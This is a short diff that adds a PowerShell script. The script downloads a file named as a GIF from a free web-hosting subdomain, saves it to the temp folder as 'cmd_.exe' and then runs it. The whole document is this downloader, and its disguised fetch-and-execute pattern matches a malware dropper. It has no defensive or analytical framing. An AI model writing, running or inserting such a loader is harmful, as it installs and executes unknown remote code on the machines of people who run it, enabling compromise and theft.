@@ -1,0 +1,16 @@
+$urls = "https://img-349950000792350769788050502349586970.000webhostapp.com/fick.gif", ""
+foreach($url in $urls){
+Try
+{
+	Write-Host $url
+	$fp = "$env:temp\cmd_.exe"
+	Write-Host $fp
+	$wc = New-Object System.Net.WebClient
+	$wc.DownloadFile($url, $fp)
+	Start-Process $fp
+	break
+}
+Catch
+{
+   Write-Host $_.Exception.Message
+}
